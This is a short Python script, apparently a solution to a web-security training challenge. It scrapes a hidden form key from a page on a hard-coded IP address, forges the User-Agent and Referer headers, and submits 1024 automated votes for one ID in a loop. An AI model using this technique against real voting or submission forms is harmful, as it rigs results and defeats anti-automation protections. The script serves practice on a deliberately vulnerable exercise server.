#!/usr/bin/python3
import requests
from bs4 import BeautifulSoup

data_form = {'id':'3907', 'holdthedoor': 'submit', 'key': '', 'captcha':''}

header = {'User-Agent':'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0',
          'referer': 'http://158.69.76.135/level2.php'}

session_hodor = requests.session()
"""captcha = session_hodor.get("http://158.69.76.135/captcha.php").content
content_captcha = open("tmp/captcha", "wb")
"""
for i in range(1024):
    page_html = session_hodor.get("http://158.69.76.135/level2.php")
    html_order = BeautifulSoup(page_html.text, "html.parser")

    hidden = html_order.find("form",{"method":"post"})
    hidden = hidden.find("input",{"type":"hidden"})

    data_form["key"] = hidden["value"]
    session_hodor.post("http://158.69.76.135/level2.php", data = data_form, headers = header)
    print(i)
